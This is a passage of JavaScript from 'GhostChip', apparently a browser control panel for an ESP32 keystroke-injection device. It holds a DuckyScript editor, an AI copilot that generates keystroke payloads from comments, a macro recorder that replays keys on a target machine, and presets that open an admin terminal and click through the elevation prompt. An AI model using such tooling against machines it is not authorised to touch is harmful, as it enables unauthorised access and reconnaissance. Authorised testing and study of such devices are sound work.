// ═══════════════════════════════════════════════════
//  GhostChip — App Logic
// ═══════════════════════════════════════════════════

const $ = id => document.getElementById(id);
let GROQ_KEY = localStorage.getItem('gc_groq_key') || '';
const GROQ_MODEL = 'llama-3.1-8b-instant';
const WARN_KEY = 'gc_legal_v2';

// ═══════════════════════════════════════════════════
//  Global Application State
// ═══════════════════════════════════════════════════
var kbActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
var simRunning = false, simAbort = false;
var targetOS = 'windows';
var scOS = 'windows';
var scCmdType = 'run';
var neo = { on: false, bright: 80, r: 0, g: 255, b: 65 };
var isRunning = false, execPoll = null, lastLogLen = 0;
var selectedSsid = null;
var ddPoll = null, ddSeen = 0;
var voiceRecog = null, isListening = false;


// ─── Smart Base URL ───
// When served from the ESP32 (same origin) → use relative URLs (no CORS)
// When opened as file:// or from another host → use absolute URL
function BASE() {
  const h = location.hostname;
  // Same origin: relative path, no CORS needed
  if (h === 'ghostchip.local' || h.startsWith('192.168.') || h === '4.1') return '';
  // External: use configured host
  return 'http://' + ($('ipInput')?.value?.trim() || 'ghostchip.local');
}
function isRemote() { return BASE() !== ''; }

var useProxy = false;
async function checkProxy() {
  if (location.hostname === 'localhost' || location.hostname === '127.0.0.1') {
    try {
      const r = await fetch('/proxy?url=' + encodeURIComponent('http://ghostchip.local/')).catch(() => null);
      if (r && r.status !== 404) {
        useProxy = true;
        console.log('[GhostChip] CORS Proxy detected and enabled.');
      } else {
        console.log('[GhostChip] CORS Proxy not running. Falling back to direct requests.');
      }
    } catch (e) {
      useProxy = false;
      console.log('[GhostChip] CORS Proxy check failed. Falling back to direct requests.', e);
    }
  }
}
checkProxy();

function getProxyUrl(url) {
  if (useProxy) {
    return '/proxy?url=' + encodeURIComponent(url);
  }
  return url;
}





// ─── Device Fetch Helper ───
// Handles CORS transparently: same-origin uses normal fetch, cross-origin uses no-cors
async function deviceFetch(path, opts = {}) {
  const url = BASE() + path;
  if (isRemote()) {
    // Cross-origin: must use no-cors for POST, means opaque response
    opts.mode = 'no-cors';
  }
  return fetch(url, opts);
}

// Same as deviceFetch but for GET requests that need JSON response
// Falls back to XMLHttpRequest which works on some ESP32 setups with CORS headers
async function deviceGet(path) {
  const url = getProxyUrl(BASE() + path);
  try {
    const r = await fetch(url);
    return await r.json();
  } catch (e) {
    // If CORS blocks fetch, try XHR as fallback
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.setRequestHeader('Accept', '*/*');
      xhr.onload = () => {
        try { resolve(JSON.parse(xhr.responseText)); }
        catch { reject(new Error('Invalid JSON')); }
      };
      xhr.onerror = () => reject(new Error('Network error'));
      xhr.timeout = 8000;
      xhr.ontimeout = () => reject(new Error('Timeout'));
      xhr.send();
    });
  }
}

// ─── Toast ───
function toast(msg, type = 'ok', dur = 3500) {
  const el = document.createElement('div');
  el.className = 'toast-item ' + type;
  const icons = { ok: '✓', err: '✗', warn: '⚠' };
  el.innerHTML = `<span>${icons[type] || '✓'}</span><span style="flex:1">${msg}</span>`;
  $('toasts').appendChild(el);
  setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; setTimeout(() => el.remove(), 300); }, dur);
}

// ─── Boot Sequence ───
const BOOT_LINES = [
  '> init esp32-s3 core...',
  '> loading drivers...',
  '> mounting spiffs...',
  '> starting wifi ap...',
  '> loading eeprom...',
  '> hid keyboard ready...',
  '> neopixel init...',
  '> web server online...',
  '> ghost chip ready ✓',
];
(function boot() {
  let i = 0;
  const log = $('bootLog'), bar = $('bootBar'), overlay = $('boot');
  let bootFinished = false;
  function finishBoot() {
    if (bootFinished) return;
    bootFinished = true;
    overlay.classList.add('done');
    setTimeout(() => {
      overlay.style.display = 'none';
      $('app').style.display = 'flex';
      if (!sessionStorage.getItem(WARN_KEY)) $('legalModal').style.display = 'flex';
      try { initApp(); }
      catch (e) {
        console.error('[GhostChip] init failed:', e);
        toast('Startup recovered. Check settings if a feature is offline.', 'warn', 4500);
      }
    }, 700);
  }
  function next() {
    if (i >= BOOT_LINES.length) {
      setTimeout(finishBoot, 400);
      return;
    }
    log.innerHTML += BOOT_LINES[i] + '<br>';
    log.scrollTop = log.scrollHeight;
    bar.style.width = Math.round(((i + 1) / BOOT_LINES.length) * 100) + '%';
    i++;
    setTimeout(next, 180 + Math.random() * 120);
  }
  next();
  setTimeout(finishBoot, 5000);
})();

$('acceptBtn').addEventListener('click', () => {
  sessionStorage.setItem(WARN_KEY, '1');
  $('legalModal').style.display = 'none';
});

// ─── Init ───
function initApp() {
  // Restore IP
  const savedIp = localStorage.getItem('gc_ip');
  if (savedIp && $('ipInput')) $('ipInput').value = savedIp;
  // Restore script
  const savedScript = localStorage.getItem('gc_script');
  if (savedScript) { $('editor').value = savedScript; updateLines(); }
  // Auto-save
  $('editor').addEventListener('input', () => {
    updateLines();
    localStorage.setItem('gc_script', $('editor').value);
  });
  $('editor').addEventListener('scroll', () => { $('lineNums').scrollTop = $('editor').scrollTop; });
  if ($('ipInput')) $('ipInput').addEventListener('change', () => localStorage.setItem('gc_ip', $('ipInput').value.trim()));
  // Try loading API key from device EEPROM if we don't have one locally
  loadApiKeyFromDevice();
}

// ─── Navigation ───
function goPage(name, btn) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
  document.body.classList.remove('tool-drawer-open');
  $('page-' + name).classList.add('active');
  btn.classList.add('active');
  // Scroll to top
  document.querySelector('.pages').scrollTop = 0;
}
function showSettings() {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
  document.body.classList.remove('tool-drawer-open');
  $('page-settings').classList.add('active');
  document.querySelectorAll('.nav-item')[4].classList.add('active');
}

// ─── Line Numbers + Syntax Highlighting ───
const DUCKY_CMDS = /^(DELAY|STRING|ENTER|GUI|ALT|CTRL|SHIFT|TAB|SPACE|REPEAT|DEFAULTDELAY|DEFAULT_DELAY|PRINT|PRINTLN|WINDOWS|COMMAND|MENU|APP|DELETE|HOME|END|INSERT|PAGEUP|PAGEDOWN|UPARROW|DOWNARROW|LEFTARROW|RIGHTARROW|SCROLLLOCK|NUMLOCK|BREAK|PAUSE|ESC|ESCAPE)(?=\s|$)/;
const DUCKY_KEYS = /\b(F[1-9]|F1[0-2]|UP|DOWN|LEFT|RIGHT|CAPSLOCK|BACKSPACE|PRINTSCREEN)\b/g;
const DUCKY_MODS = /\b(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g;

function highlightDucky(code) {
  return code.split('\n').map(line => {
    const trimmed = line.trimStart();
    // Comments
    if (trimmed.startsWith('REM')) return `<span class="hl-rem">${escHtml(line)}</span>`;
    // STRING lines
    if (trimmed.startsWith('STRING ') || trimmed.startsWith('PRINTLN ') || trimmed.startsWith('PRINT ')) {
      const sp = line.indexOf(' ');
      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-str">${escHtml(line.slice(sp + 1))}</span>`;
    }
    // DELAY with numbers
    if (trimmed.startsWith('DELAY ') || trimmed.startsWith('DEFAULTDELAY ') || trimmed.startsWith('DEFAULT_DELAY ')) {
      const sp = line.indexOf(' ');
      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-num">${escHtml(line.slice(sp + 1))}</span>`;
    }
    // REPEAT
    if (trimmed.startsWith('REPEAT ')) {
      const sp = line.indexOf(' ');
      return `<span class="hl-cmd">${escHtml(line.slice(0, sp))}</span> <span class="hl-num">${escHtml(line.slice(sp + 1))}</span>`;
    }
    // Commands with modifiers/keys
    let hl = escHtml(line);
    hl = hl.replace(/^(\s*)(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g, '$1<span class="hl-mod">$2</span>');
    hl = hl.replace(DUCKY_CMDS, '<span class="hl-cmd">$1</span>');
    hl = hl.replace(DUCKY_KEYS, '<span class="hl-key">$1</span>');
    hl = hl.replace(/\b(CTRL|SHIFT|ALT|GUI|COMMAND|WINDOWS)\b/g, '<span class="hl-mod">$1</span>');
    return hl;
  }).join('\n');
}
function escHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }

function updateLines() {
  const code = $('editor').value;
  const lines = code.split('\n').length;
  $('lineNums').innerHTML = Array.from({ length: lines }, (_, i) => `<span>${i + 1}</span>`).join('');
  $('lineCount').textContent = lines + ' line' + (lines !== 1 ? 's' : '');
  // Syntax highlight overlay
  const hl = $('editorHighlight');
  if (hl) hl.querySelector('code').innerHTML = highlightDucky(code) + '\n';
}
updateLines();
// Sync scroll between editor and highlight
const edEl = $('editor');
if (edEl) {
  edEl.addEventListener('scroll', () => {
    const hl = $('editorHighlight');
    if (hl) { hl.scrollTop = edEl.scrollTop; hl.scrollLeft = edEl.scrollLeft; }
  });
}

// ═══════════════════════════════════════════════════
//  ⚡ AUTOCOMPLETE & AI COPILOT SUGGESTIONS
// ═══════════════════════════════════════════════════
const DUCKY_AUTOCOMPLETE_ITEMS = [
  { cmd: 'DELAY', desc: 'Delay in ms', sample: 'DELAY 500' },
  { cmd: 'STRING', desc: 'Type string', sample: 'STRING hello' },
  { cmd: 'ENTER', desc: 'Press Enter key', sample: 'ENTER' },
  { cmd: 'GUI', desc: 'GUI / Super key', sample: 'GUI r' },
  { cmd: 'ALT', desc: 'Alt key modifier', sample: 'ALT F4' },
  { cmd: 'CTRL', desc: 'Control modifier', sample: 'CTRL c' },
  { cmd: 'SHIFT', desc: 'Shift modifier', sample: 'SHIFT ENTER' },
  { cmd: 'TAB', desc: 'Tab key', sample: 'TAB' },
  { cmd: 'SPACE', desc: 'Space key', sample: 'SPACE' },
  { cmd: 'REM', desc: 'Comment (Triggers AI Copilot)', sample: 'REM Open terminal' },
  { cmd: 'REPEAT', desc: 'Repeat last command', sample: 'REPEAT 3' },
  { cmd: 'DEFAULTDELAY', desc: 'Set default delay', sample: 'DEFAULTDELAY 100' },
  { cmd: 'ESCAPE', desc: 'Escape key', sample: 'ESCAPE' },
  { cmd: 'BACKSPACE', desc: 'Backspace key', sample: 'BACKSPACE' },
  { cmd: 'CAPSLOCK', desc: 'Caps lock key', sample: 'CAPSLOCK' },
  { cmd: 'UP', desc: 'Up arrow key', sample: 'UP' },
  { cmd: 'DOWN', desc: 'Down arrow key', sample: 'DOWN' },
  { cmd: 'LEFT', desc: 'Left arrow key', sample: 'LEFT' },
  { cmd: 'RIGHT', desc: 'Right arrow key', sample: 'RIGHT' }
];

var acActiveIdx = 0;
var acFiltered = [];
var aiSuggestTimer = null;
var currentAiSuggestion = '';
var aiSuggestLineIndex = -1;

function getCursorLineInfo() {
  const ed = $('editor');
  if (!ed) return null;
  const val = ed.value;
  const pos = ed.selectionStart;
  const lineStart = val.lastIndexOf('\n', pos - 1) + 1;
  let lineEnd = val.indexOf('\n', pos);
  if (lineEnd === -1) lineEnd = val.length;
  const currentLine = val.slice(lineStart, lineEnd);
  const textBeforeCursor = val.slice(lineStart, pos);
  return { val, pos, lineStart, lineEnd, currentLine, textBeforeCursor };
}

function handleEditorInput() {
  updateLines();
  const info = getCursorLineInfo();
  if (!info) return;

  // Keyword Autocomplete check
  const wordMatch = info.textBeforeCursor.match(/([a-zA-Z]{1,15})$/);
  if (wordMatch && !info.textBeforeCursor.trimStart().startsWith('REM')) {
    const query = wordMatch[1].toUpperCase();
    acFiltered = DUCKY_AUTOCOMPLETE_ITEMS.filter(item => item.cmd.startsWith(query) && item.cmd !== query);
    if (acFiltered.length > 0) {
      showAcDropdown(acFiltered);
    } else {
      hideAcDropdown();
    }
  } else {
    hideAcDropdown();
  }
}

function showAcDropdown(items) {
  const dd = $('acDropdown');
  if (!dd) return;
  acActiveIdx = 0;
  dd.innerHTML = items.map((item, i) => `
    <div class="ac-item ${i === 0 ? 'active' : ''}" onclick="acSelectIndex(${i})">
      <span class="ac-item-cmd">${item.cmd}</span>
      <span class="ac-item-desc">${item.desc}</span>
      <span class="ac-item-hint">↵ Tab</span>
    </div>
  `).join('');
  dd.style.display = 'block';
  dd.style.bottom = '10px';
  dd.style.left = '45px';
}

function hideAcDropdown() {
  const dd = $('acDropdown');
  if (dd) dd.style.display = 'none';
  acFiltered = [];
}

function acSelectIndex(idx) {
  if (idx < 0 || idx >= acFiltered.length) return;
  const item = acFiltered[idx];
  const info = getCursorLineInfo();
  if (!info) return;
  const ed = $('editor');
  const wordMatch = info.textBeforeCursor.match(/([a-zA-Z]{1,15})$/);
  if (!wordMatch) return;
  
  const replaceLen = wordMatch[1].length;
  const start = info.pos - replaceLen;
  ed.value = ed.value.slice(0, start) + item.cmd + ' ' + ed.value.slice(info.pos);
  ed.selectionStart = ed.selectionEnd = start + item.cmd.length + 1;
  hideAcDropdown();
  updateLines();
  ed.focus();
}

// Key listener for Tab / Arrow / Enter keys in editor
function handleEditorKeyDown(e) {
  const dd = $('acDropdown');
  const acOpen = dd && dd.style.display === 'block';

  if (acOpen) {
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      acActiveIdx = (acActiveIdx + 1) % acFiltered.length;
      updateAcActiveItem();
      return;
    }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      acActiveIdx = (acActiveIdx - 1 + acFiltered.length) % acFiltered.length;
      updateAcActiveItem();
      return;
    }
    if (e.key === 'Tab' || e.key === 'Enter') {
      e.preventDefault();
      acSelectIndex(acActiveIdx);
      return;
    }
    if (e.key === 'Escape') {
      hideAcDropdown();
      return;
    }
  }

  // Trigger AI Copilot ONLY when Enter key is pressed on a complete REM line
  if (e.key === 'Enter') {
    const info = getCursorLineInfo();
    if (info) {
      const trimmed = info.currentLine.trim();
      if (trimmed.startsWith('REM ') && trimmed.length > 5) {
        // Trigger AI Copilot generation after line commit
        setTimeout(() => triggerAiCopilot(trimmed), 100);
      }
    }
  }

  // AI Copilot acceptance with Tab key
  const bar = $('aiSuggestBar');
  if (bar && bar.style.display !== 'none' && currentAiSuggestion && e.key === 'Tab') {
    e.preventDefault();
    acAcceptAiSuggestion();
    return;
  }
}

function updateAcActiveItem() {
  const items = document.querySelectorAll('.ac-item');
  items.forEach((it, i) => {
    if (i === acActiveIdx) it.classList.add('active');
    else it.classList.remove('active');
  });
}

// ─── AI Copilot Inline Engine ───
async function triggerAiCopilot(remComment) {
  const apiKey = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
  if (!apiKey || apiKey.length < 5) return;

  const bar = $('aiSuggestBar');
  const loading = $('aiSuggestLoading');
  const inner = $('aiSuggestInner');
  const textEl = $('aiSuggestText');
  if (!bar) return;

  bar.style.display = 'block';
  if (loading) loading.style.display = 'flex';
  if (inner) inner.style.display = 'none';

  try {
    const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + apiKey
      },
      body: JSON.stringify({
        model: GROQ_MODEL,
        messages: [
          {
            role: 'system',
            content: `You are an AI DuckyScript Copilot. User provided a comment line: "${remComment}". Generate concise DuckyScript instructions (3-8 lines max) to perform this request. Output ONLY executable DuckyScript code without markdown fences or comments. Always include DELAY 2000 after each action line.`
          },
          { role: 'user', content: remComment }
        ],
        temperature: 0.1,
        max_tokens: 300
      })
    });
    if (!res.ok) throw new Error('AI Copilot request failed');
    const data = await res.json();
    let script = data.choices?.[0]?.message?.content?.trim() || '';
    script = script.replace(/```[\w]*\n?/g, '').trim();

    if (script) {
      currentAiSuggestion = script;
      if (textEl) textEl.textContent = script.split('\n').join(' ↵ ');
      if (loading) loading.style.display = 'none';
      if (inner) inner.style.display = 'flex';
    } else {
      acDismissAiSuggestion();
    }
  } catch (e) {
    acDismissAiSuggestion();
  }
}

function acAcceptAiSuggestion() {
  if (!currentAiSuggestion) return;
  const ed = $('editor');
  if (!ed) return;

  const info = getCursorLineInfo();
  if (info) {
    const insertPos = info.lineEnd;
    const prefix = ed.value.slice(0, insertPos);
    const suffix = ed.value.slice(insertPos);
    const addition = '\n' + currentAiSuggestion;
    ed.value = prefix + addition + suffix;
    ed.selectionStart = ed.selectionEnd = insertPos + addition.length;
  } else {
    ed.value += '\n' + currentAiSuggestion;
  }

  acDismissAiSuggestion();
  updateLines();
  saveScriptVersion('AI Copilot generated');
  localStorage.setItem('gc_script', ed.value);
  toast('AI Copilot applied ✓', 'ok', 1500);
}

function acDismissAiSuggestion() {
  currentAiSuggestion = '';
  const bar = $('aiSuggestBar');
  if (bar) bar.style.display = 'none';
}

// ═══════════════════════════════════════════════════
//  🕒 SCRIPT VERSIONING / AUTO-SAVE HISTORY
// ═══════════════════════════════════════════════════
function getScriptHistory() {
  try {
    return JSON.parse(localStorage.getItem('gc_script_history') || '[]');
  } catch (e) {
    return [];
  }
}

var logsFolderCreated = false;

async function saveVersionToDeviceLogs(script, timestampId, label) {
  try {
    // 1. First time: create /logs directory on memory card / SD card if not already created
    if (!logsFolderCreated) {
      try {
        await fmFetchPost('/fm/mkdir?path=%2Flogs');
        logsFolderCreated = true;
      } catch (e) {
        logsFolderCreated = true;
      }
    }

    // 2. Generate new filename every time using timestamp (e.g. log_20260819_211230.txt)
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const filename = `log_${now.getFullYear()}${pad(now.getMonth()+1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}.txt`;

    const uploadUrl = fmBase() + '/fm/upload?path=%2Flogs';
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([`REM --- GhostChip Log Snapshot --- \nREM Label: ${label}\nREM Created: ${now.toLocaleString()}\n\n${script}`], { type: 'text/plain' });
    const file = new File([blob], filename, { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, filename);

    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };

    await fetch(uploadUrl, opts);
  } catch (e) {
    console.log('[GhostChip] Memory card log write skipped:', e);
  }
}

function saveScriptVersion(label = 'Auto snapshot') {
  const script = $('editor')?.value || '';
  if (!script.trim()) return;

  const history = getScriptHistory();
  // Don't duplicate exact same top script
  if (history.length > 0 && history[0].script === script) return;

  const now = new Date();
  const timestampId = Date.now();
  const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' (' + (now.getMonth()+1) + '/' + now.getDate() + ')';

  history.unshift({
    id: timestampId,
    timestamp: timeStr,
    script: script,
    label: label
  });

  // Limit to 30 snapshots in local memory
  if (history.length > 30) history.pop();
  localStorage.setItem('gc_script_history', JSON.stringify(history));

  // Store new log file on memory card in /logs folder
  saveVersionToDeviceLogs(script, timestampId, label);
}

function showHistoryModal() {
  const modal = $('historyModal');
  const list = $('historyList');
  if (!modal || !list) return;

  const history = getScriptHistory();
  if (history.length === 0) {
    list.innerHTML = '<div class="empty-state">No saved versions yet</div>';
  } else {
    list.innerHTML = history.map((item, index) => `
      <div class="fav-item" style="padding:8px 10px;margin-bottom:6px;border:1px solid var(--b1);border-radius:6px;background:var(--s2);display:flex;align-items:center;justify-content:space-between;gap:8px" onclick="restoreVersion(${index})">
        <div style="min-width:0;flex:1">
          <div style="font-size:0.75rem;font-weight:700;color:var(--white);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${escHtml(item.label)}</div>
          <div style="font-size:0.62rem;color:var(--dim2);font-family:var(--mono)">${escHtml(item.timestamp)} • ${item.script.split('\n').length} lines</div>
        </div>
        <button class="btn btn-ghost sm" style="padding:2px 8px;font-size:0.65rem">Restore ↵</button>
      </div>
    `).join('');
  }

  modal.style.display = 'flex';
}

function hideHistoryModal() {
  const modal = $('historyModal');
  if (modal) modal.style.display = 'none';
}

function restoreVersion(index) {
  const history = getScriptHistory();
  if (index < 0 || index >= history.length) return;
  const item = history[index];
  $('editor').value = item.script;
  updateLines();
  localStorage.setItem('gc_script', item.script);
  hideHistoryModal();
  toast('Restored version: ' + item.label + ' ✓', 'ok', 2000);
}

function clearHistoryVersions() {
  if (!confirm('Clear all version history?')) return;
  localStorage.removeItem('gc_script_history');
  showHistoryModal();
  toast('History cleared', 'ok');
}

// ═══════════════════════════════════════════════════
//  🔴 ACTION / MACRO RECORDER
// ═══════════════════════════════════════════════════
var isRecordingMacro = false;
var macroEvents = [];
var macroLastTime = 0;

function initMacroRecorder() {
  renderMacroStream();
}

var recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
var recCapsState = 0; // 0 = lowercase, 1 = single shift, 2 = caps lock ON
var lastRecCapsTapTime = 0;

function recToggleCaps() {
  const now = Date.now();
  if (now - lastRecCapsTapTime < 350) {
    // Instant double tap -> Caps Lock Locked ON
    recCapsState = 2;
  } else {
    // Single tap -> toggle between Shift (1) and Off (0)
    recCapsState = (recCapsState === 0) ? 1 : 0;
  }
  lastRecCapsTapTime = now;
  updateRecKeyCasing();
}

function updateRecKeyCasing() {
  const isCapsOn = recCapsState > 0;
  const capsEl = $('recCaps');
  const shiftEl = $('recShift');

  if (capsEl) {
    capsEl.classList.toggle('active', recCapsState === 2);
    capsEl.textContent = recCapsState === 2 ? 'CAPS 🔒' : 'CAPS';
  }
  if (shiftEl) {
    shiftEl.classList.toggle('active', recCapsState === 1);
  }

  // Update visual key labels on Action Recorder letter buttons
  document.querySelectorAll('.rec-letter').forEach(btn => {
    const origKey = btn.getAttribute('data-key') || btn.textContent.toLowerCase();
    btn.textContent = isCapsOn ? origKey.toUpperCase() : origKey.toLowerCase();
  });
}

function sendHidAction(action) {
  if (!action) return;
  let command = action;
  if (action.length === 1 && !/\s/.test(action)) {
    command = 'STRING ' + action;
  }
  deviceFetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'duckyscript=' + encodeURIComponent(command)
  }).catch(() => {});
}

const SHIFT_SYMBOL_MAP = {
  '`': '~', '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
  '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?'
};

function recordVirtualKey(keyStr) {
  if (!isRecordingMacro) {
    return;
  }

  const modKey = keyStr.toLowerCase();
  // Check if keyStr is a modifier key (GUI, CTRL, ALT, SHIFT)
  if (['gui', 'ctrl', 'alt', 'shift'].includes(modKey)) {
    recActiveMods[modKey] = !recActiveMods[modKey];
    if (modKey === 'shift') {
      recCapsState = recActiveMods.shift ? 1 : 0;
      updateRecKeyCasing();
    }
    updateRecModVisuals();
    return;
  }

  const now = Date.now();
  const delay = Math.min(Math.max(now - macroLastTime, 50), 4000);
  macroLastTime = now;

  const isShiftActive = (recCapsState > 0 || recActiveMods.shift);

  let processedKey = keyStr;
  if (isShiftActive && SHIFT_SYMBOL_MAP[keyStr]) {
    processedKey = SHIFT_SYMBOL_MAP[keyStr];
  } else if (keyStr.length === 1 && /[a-zA-Z]/.test(keyStr)) {
    processedKey = (recCapsState > 0 || recActiveMods.shift) ? keyStr.toUpperCase() : keyStr.toLowerCase();
  }

  let mods = [];
  if (recActiveMods.ctrl) mods.push('CTRL');
  if (recActiveMods.alt) mods.push('ALT');
  if (recActiveMods.gui) mods.push('GUI');

  let finalAction = '';
  if (mods.length > 0) {
    const mainKey = (processedKey.length === 1 ? processedKey : processedKey.toUpperCase());
    finalAction = mods.join(' ') + ' ' + mainKey;
    // Reset modifiers after combo emission
    recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
    updateRecModVisuals();
  } else {
    finalAction = processedKey;
  }

  // Single character shift auto-reverts to lowercase
  if (recCapsState === 1 && keyStr.length === 1) {
    recCapsState = 0;
    recActiveMods.shift = false;
    updateRecKeyCasing();
    updateRecModVisuals();
  }

  macroEvents.push({
    key: finalAction,
    delay: delay,
    time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
  });

  renderMacroStream();
}

function updateRecModVisuals() {
  const panel = $('tool-recorder');
  if (!panel) return;
  ['shift', 'ctrl', 'alt', 'gui'].forEach(m => {
    panel.querySelectorAll(`.kb-key.mod`).forEach(btn => {
      if (btn.textContent.toLowerCase().includes(m)) {
        btn.classList.toggle('active', recActiveMods[m]);
      }
    });
  });
}

function startMacroRecord() {
  window.removeEventListener('keydown', captureMacroKey);
  isRecordingMacro = true;
  macroEvents = [];
  macroLastTime = Date.now();
  $('recStartBtn').disabled = true;
  $('recStopBtn').disabled = false;
  $('recPlayBtn').disabled = true;
  $('recDot').classList.add('run');
  $('recStatusLabel').textContent = 'Status: Recording...';
  
  window.addEventListener('keydown', captureMacroKey);
  renderMacroStream();
  toast('Macro recording started 🔴', 'ok');
}

function stopMacroRecord() {
  isRecordingMacro = false;
  window.removeEventListener('keydown', captureMacroKey);
  $('recStartBtn').disabled = false;
  $('recStopBtn').disabled = true;
  $('recPlayBtn').disabled = macroEvents.length === 0;
  $('recDot').classList.remove('run');
  $('recStatusLabel').textContent = 'Status: Stopped (' + macroEvents.length + ' events recorded)';
  toast('Recording stopped ■', 'ok');
}

function captureMacroKey(e) {
  if (!isRecordingMacro) return;
  if (e.repeat) return;

  // Ignore typing inside text inputs / textareas
  const tag = e.target?.tagName?.toLowerCase();
  if (tag === 'input' || tag === 'textarea') return;

  // Standalone modifier press - wait for main key
  if (['Control', 'Shift', 'Alt', 'Meta'].includes(e.key)) {
    return;
  }

  const now = Date.now();
  const delay = Math.min(Math.max(now - macroLastTime, 50), 4000);
  macroLastTime = now;

  let mods = [];
  if (e.ctrlKey) mods.push('CTRL');
  if (e.altKey) mods.push('ALT');
  if (e.shiftKey) mods.push('SHIFT');
  if (e.metaKey) mods.push('GUI');

  let keyName = e.key;
  if (keyName === ' ') keyName = 'SPACE';
  else if (keyName === 'Enter') keyName = 'ENTER';
  else if (keyName === 'Backspace') keyName = 'BACKSPACE';
  else if (keyName === 'Tab') keyName = 'TAB';
  else if (keyName === 'Escape') keyName = 'ESCAPE';

  let finalAction = '';
  if (mods.length > 0) {
    const mainKey = (keyName.length === 1 ? keyName.toLowerCase() : keyName.toUpperCase());
    finalAction = mods.join(' ') + ' ' + mainKey;
  } else {
    finalAction = keyName;
  }

  macroEvents.push({
    key: finalAction,
    delay: delay,
    time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
  });

  renderMacroStream();
}

function renderMacroStream() {
  const stream = $('recStream');
  if (!stream) return;
  if (macroEvents.length === 0) {
    stream.innerHTML = '<span style="color:var(--dim2)">// Actions will appear here...</span>';
    return;
  }
  stream.innerHTML = macroEvents.map((ev, i) => `
    <div style="display:flex;justify-content:space-between;padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02)">
      <span><span style="color:var(--dim2)">[${ev.delay}ms]</span> <b style="color:var(--g)">${escHtml(ev.key)}</b></span>
      <span style="color:var(--dim2);font-size:0.65rem">#${i+1}</span>
    </div>
  `).join('');
  stream.scrollTop = stream.scrollHeight;
}

async function playMacroRecord() {
  if (macroEvents.length === 0) return;
  toast('Replaying recorded macro payload...', 'ok', 2000);
  let idx = 0;
  
  async function step() {
    if (idx >= macroEvents.length) {
      toast('Macro playback completed ✓', 'ok', 2000);
      return;
    }
    const ev = macroEvents[idx++];
    toast(`Executing: ${ev.key}`, 'ok', 1000);
    
    // Execute live HID keystroke command on target device
    sendHidAction(ev.key);
    
    const nextDelay = idx < macroEvents.length ? Math.max(macroEvents[idx].delay, 100) : 500;
    setTimeout(step, Math.min(nextDelay, 3000));
  }
  
  step();
}

function clearMacroRecord() {
  macroEvents = [];
  recActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
  updateRecModVisuals();
  renderMacroStream();
  $('recPlayBtn').disabled = true;
  $('recStatusLabel').textContent = 'Status: Idle';
  toast('Recorder cleared');
}

function exportMacroToEditor() {
  if (macroEvents.length === 0) {
    toast('No actions recorded to export', 'warn');
    return;
  }

  let dsLines = ['REM --- Recorded Macro Payload ---'];
  let currentString = '';

  macroEvents.forEach(ev => {
    if (ev.delay > 300) {
      if (currentString) {
        dsLines.push('STRING ' + currentString);
        currentString = '';
      }
      dsLines.push('DELAY ' + ev.delay);
    }

    const isSingleChar = ev.key.length === 1 && !/\s/.test(ev.key);

    if (isSingleChar) {
      currentString += ev.key;
    } else {
      if (currentString) {
        dsLines.push('STRING ' + currentString);
        currentString = '';
      }
      dsLines.push(ev.key);
    }
  });

  if (currentString) {
    dsLines.push('STRING ' + currentString);
  }

  const generatedDs = dsLines.join('\n');
  $('editor').value = generatedDs;
  updateLines();
  saveScriptVersion('Recorded Macro Export');
  localStorage.setItem('gc_script', generatedDs);
  
  closeAllTools();
  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
  toast('Macro exported to DuckyScript Editor ✓', 'ok', 2000);
}

// Wire up events on editor textarea
const edArea = $('editor');
if (edArea) {
  edArea.addEventListener('input', handleEditorInput);
  edArea.addEventListener('keydown', handleEditorKeyDown);
  edArea.addEventListener('click', hideAcDropdown);
}

// ─── Presets ───
function togglePresets() {
  $('presetsDrawer').classList.toggle('open');
}
const PRESETS = {
  'win-run': 'REM Windows Run Dialog\nDELAY 500\nGUI r\nDELAY 500',
  'win-term': 'REM Windows Terminal Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 600\nLEFTARROW\nENTER',
  'win-info': 'REM Windows System Info\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 800\nSTRING systeminfo\nENTER',
